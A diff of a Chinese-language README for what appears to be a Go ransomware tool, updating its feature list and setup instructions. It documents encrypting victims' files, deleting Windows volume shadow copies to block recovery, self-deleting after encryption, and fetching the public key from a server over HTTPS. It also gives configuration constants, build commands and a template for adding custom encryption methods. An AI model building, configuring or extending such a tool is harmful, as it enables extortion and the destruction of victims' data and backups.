@@ -24,19 +24,18 @@
 
 5. 加密之后自删除文件
 
+6. 公钥传输使用https
+
+7. 删除系统卷影功能
+
+8. 多种加密方式实现
+
 ---
 
 **todo（未完成）：**
 
-~~1. 删除系统卷影功能~~
+多文件夹轮询
 
-    2. 替换桌面壁纸功能（已尝试过资源节，失败）
-
-    3. 多种加密方式实现
-
-    4. 多文件夹轮询
-
-~~5. 公钥传输使用https~~
 
 ## 安装
 
@@ -73,14 +72,16 @@ go run ./server.go ./handler.go
 
 ### 4. 配置选项
 
-#### 4.1 加密的文件后缀名和加密线程设置
+#### 4.1 加密的文件后缀名和加密线程设置还有加密方式设置
 
-`./client/enc_file/enc_file.go`
+`./client/client.go`
 
 ```bash
 const (
-	FileExtension = ".exe"
-	ThreadNumber  = 10 // Number of threads to use for encryption
+	Method        string = "CUSTOM"
+	FileExtension        = ".exe"
+	ThreadNumber         = 10 // Number of threads to use for encryption
+	FilePath      string = ""
 )
 ```
 
@@ -88,7 +89,7 @@ const (
 
 `./client/get_pub_key/get_pub_key.go`
 
-```bash
+```go
 const (
 	ServerAddr = "localhost"
 	ServerPort = "8080"
@@ -99,7 +100,7 @@ const (
 
 `./client/mutex/mutex.go`
 
-```bash
+```go
 mutexName := "Global\\mypkg_mutex"
 ```
 
@@ -116,4 +117,26 @@ go run ./cmd/client/main.go
 #### 5.2 编译
 ```bash
 go build ./cmd/client/main.go
+```
+
+### 6. 加密方式拓展编写
+
+`./client/custom_example/custom_example.go`即是编写案例
+
+需要编写的参数
+
+```go
+// 凯撒加密
+// 参数:
+//   - data: 需要加密的字节数组
+//   - shift: 加密方式中可能涉及到的自定义选项
+// 返回值:
+//   - 加密之后的字节数组
+func CaesarEncrypt(data []byte, shift int) []byte {
+	encrypted := make([]byte, len(data))
+	for i, b := range data {
+		encrypted[i] = byte((int(b) + shift) % 256)
+	}
+	return encrypted
+}
 ```
